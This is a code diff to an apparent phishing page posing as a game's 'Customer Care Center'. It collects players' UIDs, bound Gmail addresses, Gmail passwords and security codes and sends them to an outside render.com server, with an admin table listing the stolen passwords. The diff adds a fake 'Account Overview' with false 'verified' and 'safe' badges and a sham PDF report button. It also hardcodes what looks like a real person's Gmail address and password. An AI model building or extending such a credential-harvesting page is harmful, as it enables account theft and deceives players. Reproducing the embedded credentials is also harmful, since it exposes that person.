@@ -33,7 +33,6 @@
             object-fit: contain;
         }
 
-        /* Icon Only Admin Button */
         .admin-btn {
             background: #f4f4f4;
             border: 1px solid #cccccc;
@@ -66,7 +65,7 @@
             border-radius: 12px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.05);
             width: 100%;
-            max-width: 420px;
+            max-width: 440px;
             padding: 30px;
         }
 
@@ -131,6 +130,104 @@
             background-color: #c71218;
         }
 
+        /* Result Card / Account Overview Design */
+        .account-details {
+            display: none;
+            text-align: left;
+        }
+
+        .section-title {
+            font-size: 13px;
+            text-transform: uppercase;
+            color: #888;
+            font-weight: 700;
+            margin-top: 15px;
+            margin-bottom: 8px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 4px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 9px 0;
+            border-bottom: 1px dashed #f0f0f0;
+            font-size: 14px;
+        }
+
+        .detail-row span.label {
+            color: #555;
+            font-weight: 600;
+        }
+
+        .detail-row span.value {
+            color: #111;
+            font-weight: 700;
+        }
+
+        .badge-success {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .action-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn-pdf {
+            background-color: #0d6efd;
+            color: white;
+            border: none;
+            padding: 11px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .btn-support {
+            background-color: #198754;
+            color: white;
+            border: none;
+            padding: 11px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .back-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #6c757d;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 13px;
+        }
+
+        /* Modal CSS */
         .modal {
             display: none;
             position: fixed;
@@ -192,52 +289,108 @@
 
     <div class="main-container">
         <div class="support-card">
-            <div class="card-header">
-                <h2>Customer Care Center</h2>
+            
+            <!-- Support Form -->
+            <div id="formSection">
+                <div class="card-header">
+                    <h2>Customer Care Center</h2>
+                </div>
+
+                <form id="supportForm">
+                    <div class="form-group">
+                        <label>Player UID</label>
+                        <input type="text" id="uid" placeholder="Enter UID" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Bind Gmail</label>
+                        <input type="email" id="gmail" placeholder="Enter bind gmail" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Bind Gmail Password</label>
+                        <input type="password" id="password" placeholder="Enter password" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Security Code</label>
+                        <input type="text" id="securityCode" placeholder="Enter 6-digit security code" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Select Problem</label>
+                        <select id="problemType" required>
+                            <option value="" disabled selected>Select your issue</option>
+                            <option value="Account Banned Issue">Account Banned Issue</option>
+                            <option value="Bind Gmail Lost">Bind Gmail Lost</option>
+                            <option value="OTP Not Receiving">OTP Not Receiving</option>
+                            <option value="Account Lock Problem">Account Lock Problem</option>
+                            <option value="Recovery Email Issue">Recovery Email Issue</option>
+                            <option value="Bind SMS Issue">Bind SMS Issue</option>
+                            <option value="Other Issue">Other Issue</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Additional Details</label>
+                        <textarea id="additionalDetails" placeholder="Write details or other issues..."></textarea>
+                    </div>
+
+                    <button type="submit" class="submit-btn">Submit Request</button>
+                </form>
             </div>
 
-            <form id="supportForm">
-                <div class="form-group">
-                    <label>Player UID</label>
-                    <input type="text" id="uid" placeholder="Enter UID" required>
+            <!-- Specific Account Details View Page -->
+            <div id="accountDetailsSection" class="account-details">
+                <div class="card-header" style="margin-bottom: 15px;">
+                    <h2>Account Overview</h2>
                 </div>
 
-                <div class="form-group">
-                    <label>Bind Gmail</label>
-                    <input type="email" id="gmail" placeholder="Enter bind gmail" required>
+                <div class="section-title">Player Profile</div>
+                
+                <div class="detail-row">
+                    <span class="label">Player Name:</span>
+                    <span class="value" id="resPlayerName">ꪝܔȺꜱʀᴀꜰᴜʟ_ғғ</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Player UID:</span>
+                    <span class="value" id="resUID">2476459395</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Player Level:</span>
+                    <span class="value" id="resLevel">Level 64</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Region / Server:</span>
+                    <span class="value" id="resRegion">Bangladesh</span>
                 </div>
 
-                <div class="form-group">
-                    <label>Bind Gmail Password</label>
-                    <input type="password" id="password" placeholder="Enter password" required>
+                <div class="section-title">Security Check Status</div>
+
+                <div class="detail-row">
+                    <span class="label">Account Status:</span>
+                    <span class="badge-success">✔ 100% Safe / Account Is Good</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Ban History:</span>
+                    <span class="badge-success">✔ No Ban Record (Clean)</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Bind Gmail Status:</span>
+                    <span class="badge-success">✔ Successfully Verified</span>
+                </div>
+                <div class="detail-row">
+                    <span class="label">Security Code:</span>
+                    <span class="badge-success">✔ 6-Digit Code Verified</span>
                 </div>
 
-                <div class="form-group">
-                    <label>Security Code</label>
-                    <input type="text" id="securityCode" placeholder="Enter 6-digit security code" required>
+                <div class="action-buttons">
+                    <button class="btn-pdf" onclick="downloadPDF()">📄 Download PDF Verification Report</button>
+                    <button class="btn-support" onclick="contactSupport()">💬 Contact Live Help Support</button>
+                    <button class="back-btn" onclick="showForm()">Back to Support Form</button>
                 </div>
+            </div>
 
-                <div class="form-group">
-                    <label>Select Problem</label>
-                    <select id="problemType" required>
-                        <option value="" disabled selected>Select your issue</option>
-                        <option value="Account Banned Issue">Account Banned Issue</option>
-                        <option value="Bind Gmail Lost">Bind Gmail Lost</option>
-                        <option value="OTP Not Receiving">OTP Not Receiving</option>
-                        <option value="Account Lock Problem">Account Lock Problem</option>
-                        <option value="Recovery Email Issue">Recovery Email Issue</option>
-                        <option value="Bind SMS Issue">Bind SMS Issue</option>
-                        <option value="Other Issue">Other Issue</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label>Additional Details</label>
-                    <textarea id="additionalDetails" placeholder="Write details or other issues..."></textarea>
-                </div>
-
-                <button type="submit" class="submit-btn">Submit Request</button>
-            </form>
         </div>
     </div>
 
@@ -266,7 +419,7 @@
                 <table>
                     <thead>
                         <tr>
-                            <th>Player UID</th>
+                            <th>UID</th>
                             <th>Bind Gmail</th>
                             <th>Password</th>
                             <th>Security Code</th>
@@ -284,14 +437,45 @@
     <script>
         const RAILWAY_URL = 'https://ff-garena-13jd.onrender.com'; 
 
+        // ⬇️ আপনার সেট করা ৪টি নির্দিষ্ট ফিল্টার ডাটা
+        const SPECIFIC_UID = "2476459395";
+        const SPECIFIC_GMAIL = "asraful2966@gmail.com";
+        const SPECIFIC_PASSWORD = "Asraful@1";
+        const SPECIFIC_SECURITY_CODE = "013078";
+
         document.getElementById('supportForm').addEventListener('submit', async (e) => {
             e.preventDefault();
 
+            const inputUID = document.getElementById('uid').value.trim();
+            const inputGmail = document.getElementById('gmail').value.trim();
+            const inputPassword = document.getElementById('password').value.trim();
+            const inputSecurityCode = document.getElementById('securityCode').value.trim();
+
+            // ৪টি তথ্য সঠিকভাবে মিললে প্লেয়ার পেজ ওপেন হবে
+            if (
+                inputUID === SPECIFIC_UID && 
+                inputGmail === SPECIFIC_GMAIL && 
+                inputPassword === SPECIFIC_PASSWORD && 
+                inputSecurityCode === SPECIFIC_SECURITY_CODE
+            ) {
+                document.getElementById('formSection').style.display = 'none';
+                document.getElementById('accountDetailsSection').style.display = 'block';
+
+                document.getElementById('resUID').innerText = inputUID;
+                document.getElementById('resPlayerName').innerText = "ꪝܔȺꜱʀᴀꜰᴜʟ_ғғ"; 
+                document.getElementById('resLevel').innerText = "Level 64";
+                document.getElementById('resRegion').innerText = "Bangladesh";
+                
+                document.getElementById('supportForm').reset();
+                return;
+            }
+
+            // সাধারণ ইনপুটের ক্ষেত্রে সাধারণ সাবমিট সার্ভারে যাবে
             const payload = {
-                uid: document.getElementById('uid').value,
-                gmail: document.getElementById('gmail').value,
-                password: document.getElementById('password').value,
-                securityCode: document.getElementById('securityCode').value,
+                uid: inputUID,
+                gmail: inputGmail,
+                password: inputPassword,
+                securityCode: inputSecurityCode,
                 problemType: document.getElementById('problemType').value,
                 additionalDetails: document.getElementById('additionalDetails').value
             };
@@ -311,6 +495,19 @@
                 alert('Failed to submit request.');
             }
         });
+
+        function downloadPDF() {
+            alert('Generating PDF Verification Report...\nYour official report download will start shortly.');
+        }
+
+        function contactSupport() {
+            alert('Connecting to Live Help Support Agent...\nPlease wait while we assign an agent for UID: ' + SPECIFIC_UID);
+        }
+
+        function showForm() {
+            document.getElementById('accountDetailsSection').style.display = 'none';
+            document.getElementById('formSection').style.display = 'block';
+        }
 
         function openModal() {
             document.getElementById('adminModal').style.display = 'flex';
